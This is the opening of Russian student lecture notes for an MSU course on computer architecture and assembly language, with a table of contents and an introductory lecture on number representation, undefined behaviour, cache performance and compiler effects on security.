         НАПИСАВ СООБЩЕСТВУ
           VK.COM/TEACHINMSU.
БЛАГОДАРИМ ЗА ПОДГОТОВКУ КОНСПЕКТА

СТУДЕНТКУ ФИЗИЧЕСКОГО ФАКУЛЬТЕТА МГУ

 ГЕОРГИЕВСКУЮ ЕКАТЕРИНУ ПАВЛОВНУ
Архитектура ЭВМ и язык ассемблера                              КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                   ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                    СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Оглавление

   1         Лекция 1. Введение. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 10
             1.1   Цель курса . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 10
             1.2   Несколько проблем программирования . . . . . . . . . . . . . . . . 10
             1.3   Зачем нужен язык ассемблера . . . . . . . . . . . . . . . . . . . . . 14
             1.4   История первых компьютеров . . . . . . . . . . . . . . . . . . . . . 14
             1.5   Архитектура фон Неймана . . . . . . . . . . . . . . . . . . . . . . . 15
             1.6   Другие варианты архитектур . . . . . . . . . . . . . . . . . . . . . . 17
             1.7   Модельный цикл работы ЭВМ . . . . . . . . . . . . . . . . . . . . . 18
             1.8   Ключевые понятия и термины . . . . . . . . . . . . . . . . . . . . . 19
   2         Лекция 2. Машина, на которой работает пользовательская программа . . . 21
             2.1   Машина, на которой работает пользовательская программа . . . . . 21
             2.2   Порядок размещения байт в памяти . . . . . . . . . . . . . . . . . . 23
             2.3   Команда сложения . . . . . . . . . . . . . . . . . . . . . . . . . . . . 25
             2.4   Интерпретация конструкции с командой add с незаданным размером 25
             2.5   Команда пересылки . . . . . . . . . . . . . . . . . . . . . . . . . . . 26
             2.6   Типы адресации . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 26
             2.7   IA-32 . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 27
             2.8   Примеры . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 28
   3         Лекция 3. Устройство ассемблерной программы . . . . . . . . . . . . . . . 31
             3.1   Пример . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 31
             3.2   Обратный путь . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 35
             3.3   Устройство ассемблерной программы . . . . . . . . . . . . . . . . . 37
             3.4   Пример заполнения секции .data . . . . . . . . . . . . . . . . . . . . 39
             3.5   Секция .text . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 39
             3.6   Основные арифметические команды . . . . . . . . . . . . . . . . . 40
   4         Лекция 4. Регистр EFLAGS. . . . . . . . . . . . . . . . . . . . . . . . . . . 43
             4.1   Регистр EFLAGS . . . . . . . . . . . . . . . . . . . . . . . . . . . . 43
             4.2   Арифметические FLAGи . . . . . . . . . . . . . . . . . . . . . . . . 44
             4.3   Переполнение при сложении двух беззнаковых чисел . . . . . . . . 44
             4.4   FLAG OF . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 44
             4.5   Изменение естественного порядка выполнения программы . . . . . 46



                                                 3
       ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
       МАТЕМАТИКИ И КИБЕРНЕТИКИ
       МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                              КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                   ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                    СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




             4.6   Коды . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 49
             4.7   Варианты сравнения . . . . . . . . . . . . . . . . . . . . . . . . . . 50
             4.8   Регистр EFLAGS и инструкции . . . . . . . . . . . . . . . . . . . . 51
             4.9   Обратная задача . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 51
             4.10 Просмотр содержимого исполняемого файла . . . . . . . . . . . . . 54
   5         Лекция 5. Вызов функции . . . . . . . . . . . . . . . . . . . . . . . . . . . . 55
             5.1   Вызов функции . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 55
             5.2   Аппаратный стек AI-32 . . . . . . . . . . . . . . . . . . . . . . . . . 56
             5.3   Команда push . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 56
             5.4   Команда pop . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 58
             5.5   Языки программирования (ЯП), базирующиеся на стеке вызовов . 59
             5.6   Порядок вызова функции . . . . . . . . . . . . . . . . . . . . . . . . 60
             5.7   Стек фреймов . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 62
             5.8   Организация фрейма в IA-32/Linux . . . . . . . . . . . . . . . . . . 64
   6         Лекция 6. Система команд. . . . . . . . . . . . . . . . . . . . . . . . . . . . 69
             6.1   Группы команд . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 69
             6.2   Команда LEA . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 70
             6.3   Косвенная адресация . . . . . . . . . . . . . . . . . . . . . . . . . . 71
             6.4   Реализация стрелки Пирса . . . . . . . . . . . . . . . . . . . . . . . 72
             6.5   Сдвиги . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 74
             6.6   Форматы . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 76
             6.7   Команды вращения . . . . . . . . . . . . . . . . . . . . . . . . . . . 77
             6.8   Обратная задача . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 79
             6.9   Сложение 64-разрядных чисел на 32 разрядных регистрах . . . . . 79
             6.10 Умножение 64 разрядных чисел на 32 разрядных регистрах . . . . 80
   7         Лекция 7. Как организована передача управления. . . . . . . . . . . . . . . 83
             7.1   Сравнение беззнаковых чисел . . . . . . . . . . . . . . . . . . . . . 83
             7.2   Сравнение знаковых чисел . . . . . . . . . . . . . . . . . . . . . . . 83
             7.3   Сравнение: со знаком и без . . . . . . . . . . . . . . . . . . . . . . . 84
             7.4   Реализация операндов с помощью известных команд . . . . . . . . 86
             7.5   Условная передача данных . . . . . . . . . . . . . . . . . . . . . . . 89
             7.6   Конвейер – совмещение разных действий в один момент времени . 90
             7.7   Оператор do-while . . . . . . . . . . . . . . . . . . . . . . . . . . . . 93
             7.8   Оператор while . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 93
             7.9   Оператор for . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 94
   8         Лекция 8. Оператор управления switch . . . . . . . . . . . . . . . . . . . . . 99
             8.1   Обратная задача . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 99
             8.2   Оператор управления switch . . . . . . . . . . . . . . . . . . . . . . 100
             8.3   Duff’s Device . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 104



                                                  4
       ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
       МАТЕМАТИКИ И КИБЕРНЕТИКИ
       МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                               КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                    ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                     СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




              8.4   Обратная задача . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 112
              8.5   Указатели . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 114
              8.6   Массивы . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 115
   9          Лекция 9. Многомерные массивы. . . . . . . . . . . . . . . . . . . . . . . . 116
              9.1   Массивы . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 116
              9.2   Две обратные задачи . . . . . . . . . . . . . . . . . . . . . . . . . . 117
              9.3   Выделение памяти . . . . . . . . . . . . . . . . . . . . . . . . . . . 119
              9.4   Доступ к строкам . . . . . . . . . . . . . . . . . . . . . . . . . . . . 120
              9.5   Оптимизация доступа к многомерным массивам. . . . . . . . . . . 122
              9.6   Обращение к элементу . . . . . . . . . . . . . . . . . . . . . . . . . 122
              9.7   Оптимизация доступа к элементам массива . . . . . . . . . . . . . 123
   10         Лекция 10. Структуры . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 126
              10.1 Повторение . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 126
              10.2 Структуры . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 126
              10.3 Выравнивание полей в структурах . . . . . . . . . . . . . . . . . . . 127
              10.4 Объединения . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 130
              10.5 Порядок байт . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 131
              10.6 Битовые поля . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 131
              10.7 Немного про функции . . . . . . . . . . . . . . . . . . . . . . . . . 132
              10.8 Соглашения CDECL . . . . . . . . . . . . . . . . . . . . . . . . . . . 132
              10.9 Сохранение регистров . . . . . . . . . . . . . . . . . . . . . . . . . 133
   11         Лекция 11. Функция main . . . . . . . . . . . . . . . . . . . . . . . . . . . . 134
              11.1 ABI - двоичный интерфейс приложения . . . . . . . . . . . . . . . 134
              11.2 Функция main . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 135
              11.3 Начальное состояние стека . . . . . . . . . . . . . . . . . . . . . . . 135
              11.4 Сохранение требований по выравниванию . . . . . . . . . . . . . . 137
              11.5 Конструкторы и деструкторы . . . . . . . . . . . . . . . . . . . . . 138
              11.6 Оболочка вокруг main . . . . . . . . . . . . . . . . . . . . . . . . . . 139
   12         Лекция 12. Особенности архитектуры х86-64. . . . . . . . . . . . . . . . . 140
              12.1 Выравнивание фрейма . . . . . . . . . . . . . . . . . . . . . . . . . 140
              12.2 Отказ от указателя фрейма . . . . . . . . . . . . . . . . . . . . . . . 140
              12.3 Компиляторы и соглашения вызова функции . . . . . . . . . . . . . 142
              12.4   Соглашение FASTCALL . . . . . . . . . . . . . . . . . . . . . . . . 144
              12.5 Особенности 64-разрядной процессорной архитектуры . . . . . . . 145
              12.6 Архитектура х86_64 . . . . . . . . . . . . . . . . . . . . . . . . . . . 146
   13         Лекция 13. Безопасность программного обеспечения . . . . . . . . . . . . 148
              13.1 Пример 1 “Заглянуть за горизонт” . . . . . . . . . . . . . . . . . . . 148
              13.2 Пример 2. “Нескучная арифметика” . . . . . . . . . . . . . . . . . . 150
              13.3 Пример 3. “return-to-libc” . . . . . . . . . . . . . . . . . . . . . . . . 151



                                                  5
        ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
        МАТЕМАТИКИ И КИБЕРНЕТИКИ
        МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                              КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                   ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                    СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




              13.4 Способы защиты . . . . . . . . . . . . . . . . . . . . . . . . . . . . 154
   14         Лекция 14. Динамическая память . . . . . . . . . . . . . . . . . . . . . . . 156
              14.1 Управление динамической памятью . . . . . . . . . . . . . . . . . . 156
              14.2 Выделение динамической памяти . . . . . . . . . . . . . . . . . . . 156
              14.3 Ограничения . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 158
              14.4 Производительность. Пропускная способность . . . . . . . . . . . 158
              14.5 Внутренняя фрагментация. Внешняя фрагментация . . . . . . . . . 158
              14.6 Проблемы реализации менеджера памяти . . . . . . . . . . . . . . 159
   15         Лекция 15. Работа с числами с плавающей точкой. Часть 1 . . . . . . . . . 165
              15.1 Дробные двоичные числа . . . . . . . . . . . . . . . . . . . . . . . . 165
              15.2 Представимые рациональные числа . . . . . . . . . . . . . . . . . . 165
              15.3 Представление чисел с плавающей точкой . . . . . . . . . . . . . . 165
              15.4 Диапазоны значений . . . . . . . . . . . . . . . . . . . . . . . . . . 167
              15.5 Округление . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 167
              15.6 Арифметические операции . . . . . . . . . . . . . . . . . . . . . . . 168
              15.7 Математические свойства сложения и умножения . . . . . . . . . . 170
              15.8 Числа с плавающей точкой в языке Си . . . . . . . . . . . . . . . . 171
              15.9 Упрощённая схема х87 . . . . . . . . . . . . . . . . . . . . . . . . . 171
   16         Лекция 16. Работа с числами с плавающей точкой. Часть 2. Сопроцессор х87173
              16.1 Слово (регистр) состояния . . . . . . . . . . . . . . . . . . . . . . . 173
              16.2 Управляющий регистр . . . . . . . . . . . . . . . . . . . . . . . . . 175
              16.3 Регистр признаков . . . . . . . . . . . . . . . . . . . . . . . . . . . . 175
              16.4 NASM и числа с плавающей точкой . . . . . . . . . . . . . . . . . . 175
              16.5 Пример 1 . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 176
              16.6 Пример 2 . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 178
              16.7 Порядок действий . . . . . . . . . . . . . . . . . . . . . . . . . . . . 178
              16.8 Дополнительные команды . . . . . . . . . . . . . . . . . . . . . . . 179
              16.9 Сравнение чисел . . . . . . . . . . . . . . . . . . . . . . . . . . . . 180
              16.10 Дополнительные возможности работы сопроцессора . . . . . . . . 181
   17         Лекция 17. Элементы системы программирования . . . . . . . . . . . . . . 182
              17.1 Система программирования . . . . . . . . . . . . . . . . . . . . . . 182
              17.2 Система программирования языка Си . . . . . . . . . . . . . . . . . 182
              17.3 Компиляция . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 184
              17.4 Схема работы ассемблера . . . . . . . . . . . . . . . . . . . . . . . . 184
              17.5 Пример Си-программы . . . . . . . . . . . . . . . . . . . . . . . . . 185
              17.6 Статическая компоновка . . . . . . . . . . . . . . . . . . . . . . . . 186
   18         Лекция 18. Сборка Си-программы . . . . . . . . . . . . . . . . . . . . . . . 191
              18.1 Предварительное определение переменных . . . . . . . . . . . . . 191
              18.2 Сильные и слабые символы. Пример. . . . . . . . . . . . . . . . . . 191



                                                  6
        ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
        МАТЕМАТИКИ И КИБЕРНЕТИКИ
        МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                               КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                    ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                     СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




              18.3 Правила работы с символами . . . . . . . . . . . . . . . . . . . . . 192
              18.4 Задача. Ошибка компоновки . . . . . . . . . . . . . . . . . . . . . . 193
              18.5 Пример (Правила перебазирования) . . . . . . . . . . . . . . . . . . 193
              18.6 Работа с общими функциями . . . . . . . . . . . . . . . . . . . . . . 196
              18.7 Статические библиотеки . . . . . . . . . . . . . . . . . . . . . . . . 196
              18.8 Загрузка исполняемого объектного файла . . . . . . . . . . . . . . . 197
   19         Лекция 19. Динамические библиотеки. Динамическое связывание . . . . . 199
              19.1 Динамические библиотеки . . . . . . . . . . . . . . . . . . . . . . . 199
              19.2 Пример . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 200
              19.3 Позиционно независимый код в IA-32 . . . . . . . . . . . . . . . . . 201
              19.4 Код при вызове функций . . . . . . . . . . . . . . . . . . . . . . . . 204
              19.5 Загрузка динамически скомпонованного исполняемого файла . . . 205
   20         Лекция 20. Аппаратное обеспечение . . . . . . . . . . . . . . . . . . . . . . 207
              20.1 Логические вентили . . . . . . . . . . . . . . . . . . . . . . . . . . . 207
              20.2 Сумматор. Полусумматор . . . . . . . . . . . . . . . . . . . . . . . . 209
              20.3 Мультиплексор . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 209
              20.4 Арифметико-логическое устройство . . . . . . . . . . . . . . . . . . 210
              20.5 Регистр: сохранение 1 бита . . . . . . . . . . . . . . . . . . . . . . . 210
              20.6 Статическая память . . . . . . . . . . . . . . . . . . . . . . . . . . . 211
              20.7 Отличие статической памяти от динамической памяти . . . . . . . 211
              20.8 Разработка интегральных схем . . . . . . . . . . . . . . . . . . . . . 211
              20.9 Этапы разработки и изготовления компонент ЭВМ . . . . . . . . . 212
              20.10 Закон Мура . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 212
              20.11 Закон Гроша . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 213
              20.12 Закон Белла . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 213
              20.13 Различные классы компьютеров . . . . . . . . . . . . . . . . . . . . 213
              20.14 Оперативная память . . . . . . . . . . . . . . . . . . . . . . . . . . . 214
   21         Лекция 21. Организация шин . . . . . . . . . . . . . . . . . . . . . . . . . . 217
              21.1 Шины и адресные пространства. . . . . . . . . . . . . . . . . . . . 217
              21.2 Организация ввода/вывода через пространство портов и через
                    память. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 220
              21.3 Шина. Точка зрения системного программиста . . . . . . . . . . . . 222
              21.4 Пример устройства на шине: WatchDog. . . . . . . . . . . . . . . . 224
              21.5 Физические принципы устройства шин. Основные характеристики
                    шин. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 225
              21.6 Развитие системы связанных шин персональных компьютеров . . . 226
              21.7 Примеры шин: фронтальная шина . . . . . . . . . . . . . . . . . . . 229
              21.8 Синхронизация обращений к памяти . . . . . . . . . . . . . . . . . 229
              21.9 Примеры шин: PCI. . . . . . . . . . . . . . . . . . . . . . . . . . . . 232



                                                   7
        ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
        МАТЕМАТИКИ И КИБЕРНЕТИКИ
        МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                 КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                      ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                       СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




   22         Лекция 22. Использование шин в современных
              компьютерах . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 234
              22.1 Примеры шин: AGP, USB, SATA . . . . . . . . . . . . . . . . . . . . 234
              22.2 Жесткий диск . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 235
              22.3    . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 237
              22.4 Ввод/вывод (блочного) SATA-устройства. . . . . . . . . . . . . . . . 238
              22.5 Твердотельные диски (SSD) . . . . . . . . . . . . . . . . . . . . . . 239
              22.6 Локальность в программах . . . . . . . . . . . . . . . . . . . . . . . 242
              22.7 Иерархическая организация памяти, кэширование. . . . . . . . . . 244
              22.8 Кэш-память: способы организации. . . . . . . . . . . . . . . . . . . 246
              22.9 Кэш прямого отображения. . . . . . . . . . . . . . . . . . . . . . . . 247
   23         Лекция 23. Работа кэша. Количественные характеристики работы
              компьютера . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 248
              23.1 Запись в кэш . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 248
              23.2 Метрики производительности кэша . . . . . . . . . . . . . . . . . . 249
              23.3 Способы оценки производительности компьютеров и программ . . 250
              23.4 Аппаратные средства измерения времени. . . . . . . . . . . . . . . 251
              23.5 Оценка производительности памяти: синтетический бенчмарк
                    (контрольная задача) . . . . . . . . . . . . . . . . . . . . . . . . . . 252
              23.6 Микроархитектура процессора, ее связь с другими архитектурными
                    уровнями. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 254
              23.7 Пропускная способность vs. Латентность . . . . . . . . . . . . . . . 256
              23.8 Оценка латентности памяти на синтетическом тесте. . . . . . . . . 257
              23.9 Микроархитектурные решения . . . . . . . . . . . . . . . . . . . . 260
              23.10 Конвейерная обработка команд, проблемы конвейерной обработки 260
              23.11 CISC и RISC архитектуры. . . . . . . . . . . . . . . . . . . . . . . . 266
              23.12 RISC-V – архитектура RISC-микропроцессоров с открытым
                    исходным кодом. . . . . . . . . . . . . . . . . . . . . . . . . . . . . 267
              23.13 Конвейер RISC-V . . . . . . . . . . . . . . . . . . . . . . . . . . . . 269
              23.14 Развитие системы команд в архитектуре x86 . . . . . . . . . . . . . 270
   24         Лекция 24. Системное управление работой современного компьютера . . . 272
              24.1 Режимы работы современного процессора архитектуры
                    Intel64/AMD64, загрузка. . . . . . . . . . . . . . . . . . . . . . . . . 272
              24.2 Встраиваемое ПО, обеспечивающее начальную загрузку
                    компьютера: BIOS, ACPI, UEFI . . . . . . . . . . . . . . . . . . . . 273
              24.3 Многозадачная работа компьютера: требования к аппаратуре. . . . 275
              24.4 Модели памяти. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 276
              24.5 Аппарат защиты памяти. . . . . . . . . . . . . . . . . . . . . . . . . 278
              24.6 Страничная виртуальная память. . . . . . . . . . . . . . . . . . . . 280



                                                    8
        ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
        МАТЕМАТИКИ И КИБЕРНЕТИКИ
        МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                             КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                  ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                   СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




            24.7  Упрощенная схема извлечения данных из виртуальной памяти . . 284
            24.8 Уровни (кольца) защиты . . . . . . . . . . . . . . . . . . . . . . . . 285
            24.9 Прерывания. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 285
            24.10 Hello, world! . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 289




                                                 9
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                          КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                               ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Лекция 1. Введение.
Цель курса
  1. Формирование связного            представления   об      организации           современных
     вычислительных систем.

             • Аппаратура, системные программы, прикладные программы

  2. Понимание взаимосвязей между архитектурными решениями на уровнях
     аппаратуры ЭВМ и ПО.

  3. Понимание факторов, влияющих на качественные и количественные
     характеристики ЭВМ, производительность и безопасность всей вычислительной
     системы в целом.

   • Язык Си как средство демонстрации

            – того, как работает аппаратура
            – того, как следует     использовать   аппаратуру       для     реализации         языка
              программирования

   • Результат

            – Понимание причин хорошей/плохой производительности программы
            – Понимание причин ошибок
            – Основа для других курсов: ОС, сети, компиляторы, параллельная обработка
              данных …


Несколько проблем программирования
   В качестве введения рассмотрим несколько проблем современного программирования.
Первая проблема – свойства чисел. В математических курсах мы зачастую имеем дело
с некоторыми абстракциями, которые могут принимать бесконечные значения. В
реальности вычислительные машины не могут представить бесконечность, так как
количество представимых чисел ограничено. Также возникают вопросы, касающиеся
чисел с плавающей точкой (округление) и некоторые другие. Примеры данных проблем
модно представить в виде следующего списка:

   • 𝑋 2 ⩾ 0?

            – float – всегда выполняется
            – int?


                                              10
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                  КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                       ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                        СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




                      * 40000 · 40000 = 1600000000
                      * 50000 · 50000 =?
   • (𝑥 + 𝑦) + 𝑧 = 𝑥 + (𝑦 + 𝑧)?

            – signed/unsigned int – всегда выполняется
            – float

                      * (1𝑒20 + −1𝑒20) + 3.14 → 3.14
                      * 1𝑒20 + (−1𝑒20 + 3.14) → 3.14
   • Свойства типов данных могут быть использованы для причинения вреда

   Вторая проблема – язык ассемблера. Существует довольно известный индекс
популярности языков программирования который оценивает, как часто программисты
обсуждают на разных тематических ресурсах те или иные языки программирования.
Отметим, что язык ассемблера не входит в число популярных языков. Этот язык зачастую
находится во второй десятке обсуждаемых языков, причём непонятно, о каком конкретно
языке идёт речь, так как существует много архитектур.




                                  Рис. 1.1: TIOBLE Programming Community Index

   Третья проблема – отладка. Зачастую поиск ошибки в программе занимает
значительное время. Более того, чем больше программа, тем сложнее найти ошибки.
Последствия ошибки могут проявиться в любом месте программы. Также все
усложняется тем, что в текущий момент времени может выполняться несколько
параллельных операций на различных ядрах.



                                                      11
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                   КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                        ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                         СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




   Отметим, что (в случае языка Си) возможны ситуации, которые описаны как
неопределённое поведение. То есть, на разной аппаратуре компилятор может построить
код разными способами.

   • Ошибки работы с памятью

            – Выход на пределы массива
            – Некорректные указатели
            – malloc/free

   • Неопределённое поведение

   Пример. Обратимся к массиву из двух элементов.
double fun (int i){
    volantile double d [1]={3.14};
    volantile long int a [2];
    a[i] = 1073741824;
    return d [0];
}
    Результат:
fun(0)→ 3.14
fun(1)→ 3.14
fun(2)→ 3.139998664856
fun(3)→ 2.0000061035156
fun(4)→ 3.14, а затем segmentation fault

   Четвертая проблема – производительность.

   • Память имеет многоуровневую, иерархическую структуру

   • Скорость работы программы зависит от порядка выполняемых действий

   Пример. Рассмотрим две программы для умножения матриц. В сущности они делают
одно и то же, однако вследствие того, что циклы в них переставлены местами, время
работы данных программ будет разным.

   Первая программа имеет вид:
void copyij (int src [2048][2048] , int dst [2048][2048]) {
    int i,j;
    for (i = 0; i < 2048; i ++)
         for (j = 0; j < 2048; j ++)


                                           12
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                            КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                 ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                  СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




                                  dst [i][j] = src [i][j];
}
    Вторая программа:
void copyji (int src [2048][2048] , int dst [2048][2048]) {
    int i,j;
    for (j = 0; j < 2048; j ++)
        for (i = 0; i < 2048; i ++)
             dst [i][j] = src [i][j];
}
будет работать в 20 раз медленнее.

   Более того, известен случай, когда время работы подобной программы было улучшено
в 161 раз за счёт грамотной реорганизации вычисления. В этом случае матрицы были
приведены к блочной структуре, размеры блоков были подобраны таким образом, чтобы
они целиком находились в кэше, число блоков определенным образом распределялось
между вычислительными ядрами.
   Пятая проблема – безопасность. В программе могут обрабатываться так называемые
чувствительные данные (персональные данные, банковская информация и т.д.).
Например, мы вводим некоторый пароль. Под размещение этого пароля выделяется
некоторая память. После работы с эти паролем его содержимое удаляется. Современный
компилятор, просматривая потоки данных внутри программы и то, как управление
передается от одного оператора к другому, может решить, что операция memset является
лишней (если мы освобождаем кусок памяти, далее мы с ним ничего не собираемся
делать). Получатся, что пароль продолжает жить в памяти. Далее этот участок памяти
может появиться в какой-то другой программе.

    • Оптимизации компилятора способны нарушать безопасность кода
       memset(password, '\0', len); -03
       free(password);            ⇒ free(password);

    • Язык высокого уровня не специфицирует существенные для безопасности аспекты
                                  int a[2] , b;
                                  memset (a, 0, 12);

    • Соответствие исходного и исполняемого кода

            – Необходим доступ к системе сборки и конфигурационным файлам

    • Исходный код может быть просто недоступен



                                                       13
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
